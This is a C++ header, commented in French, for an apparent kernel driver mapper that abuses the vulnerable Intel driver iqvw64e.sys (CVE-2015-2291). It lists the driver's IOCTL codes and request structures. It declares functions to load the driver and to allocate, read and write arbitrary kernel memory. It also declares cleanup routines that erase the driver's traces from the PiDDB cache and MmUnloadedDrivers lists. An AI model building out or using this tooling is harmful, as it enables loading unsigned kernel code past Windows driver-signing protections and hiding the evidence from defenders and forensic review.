#pragma once

#include <Windows.h>
#include <cstdint>
#include <string>

//
// iqvw64e.sys — Intel Network Adapter Diagnostic Driver
// Device : \\.\Nal
//
// Ces IOCTLs sont dans le domaine public depuis 2019 (CVE-2015-2291)
// Utilisés par kdmapper et tous les mappers modernes.
//

#define IOCTL_IQVW64_COPY_MEMORY        0x80862007  // MmMapIoSpace wrapper
#define IOCTL_IQVW64_UNMAP_MEMORY       0x8086200B  // MmUnmapIoSpace
#define IOCTL_IQVW64_ALLOC_NONPAGED     0x80862003  // ExAllocatePool(NonPagedPool)
#define IOCTL_IQVW64_FREE_POOL          0x80862005  // ExFreePool
#define IOCTL_IQVW64_GET_PHYS_ADDR      0x80862009  // MmGetPhysicalAddress
#define IOCTL_IQVW64_READ_PHYS          0x80862013  // lecture physical memory
#define IOCTL_IQVW64_WRITE_PHYS         0x8086200F  // écriture physical memory

// Nom du device créé par iqvw64e.sys
#define INTEL_DEVICE_NAME   L"\\\\.\\Nal"
// Nom du service
#define INTEL_SERVICE_NAME  L"iqvw64e"
// Nom de fichier driver
#define INTEL_DRIVER_NAME   L"iqvw64e.sys"

//
// Structure pour l'IOCTL de copie mémoire (MmCopyMemory en kernel)
//
struct IntelCopyRequest {
    uint64_t Destination;
    uint64_t Source;
    uint64_t Length;
    uint32_t Padding1;
    uint64_t Padding2;
};

//
// Structure pour AllocPool
//
struct IntelAllocRequest {
    uint64_t    Size;
    uint64_t    OutAddress;   // rempli par le kernel
};

//
// Structure pour FreePool
//
struct IntelFreeRequest {
    uint64_t    Address;
};

//
// Namespace pour les opérations Intel driver
//
namespace IntelDriver {

    // Charge le driver Intel depuis les ressources du mapper
    // Retourne le handle de device ou INVALID_HANDLE_VALUE
    HANDLE Load(const std::wstring& driverPath);

    // Décharge et supprime le service Intel
    void   Unload();

    // Obtenir le handle
    HANDLE GetHandle();

    //
    // Opérations kernel via le driver vulnérable
    //

    // Alloue de la mémoire NonPagedPool en kernel
    // Retourne l'adresse kernel ou 0 sur échec
    uint64_t AllocatePool(HANDLE hDriver, size_t size);

    // Libère un pool kernel
    bool FreePool(HANDLE hDriver, uint64_t address);

    // Copie de la mémoire user vers kernel
    bool WriteKernelMemory(HANDLE hDriver, uint64_t kernelDst, const void* src, size_t size);

    // Copie de la mémoire kernel vers user
    bool ReadKernelMemory(HANDLE hDriver, void* dst, uint64_t kernelSrc, size_t size);

    // Patch un pointeur de fonction en kernel (pour les cleanups PiDDB/MmUnloaded)
    bool WriteKernelQWord(HANDLE hDriver, uint64_t kernelAddr, uint64_t value);
    uint64_t ReadKernelQWord(HANDLE hDriver, uint64_t kernelAddr);

    //
    // Cleanup post-mapping
    //

    // Efface l'entrée du driver Intel dans PiDDB cache
    bool ClearPiDdbCache(HANDLE hDriver, const std::wstring& driverName, uint32_t timestamp);

    // Efface l'entrée dans MmUnloadedDrivers
    bool ClearMmUnloadedDrivers(HANDLE hDriver, const std::wstring& driverName);

} // namespace IntelDriver
